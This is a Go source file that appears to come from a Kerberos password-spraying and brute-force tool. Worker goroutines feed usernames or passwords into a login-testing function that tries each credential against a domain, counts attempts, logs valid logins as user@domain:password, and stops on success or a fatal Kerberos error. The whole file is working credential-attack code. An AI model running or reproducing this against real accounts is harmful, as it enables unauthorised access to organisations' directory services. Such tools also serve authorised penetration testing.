package cmd

import (
	"context"
	"fmt"
	"sync"
	"sync/atomic"
)

func makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			testLogin(ctx, username, password)
		}
	}
}

func makeBruteWorker(ctx context.Context, passwords <-chan string, wg *sync.WaitGroup, username string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case password, ok := <-passwords:
			if !ok {
				return
			}
			testLogin(ctx, username, password)
		}
	}
}

func testLogin(ctx context.Context, username string, password string) {
	atomic.AddInt32(&counter, 1)
	login := fmt.Sprintf("%v@%v:%v", username, domain, password)
	if ok, err := kSession.TestLogin(username, password); ok {
		atomic.AddInt32(&successes, 1)
		logger.Log.Noticef("[+] VALID LOGIN:\t %s", login)
		if stopOnSuccess {
			cancel()
		}
	} else {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", login, errorString)
			cancel()
		}
		logger.Log.Debugf("[!] %v - %v", login, errorString)
	}
}
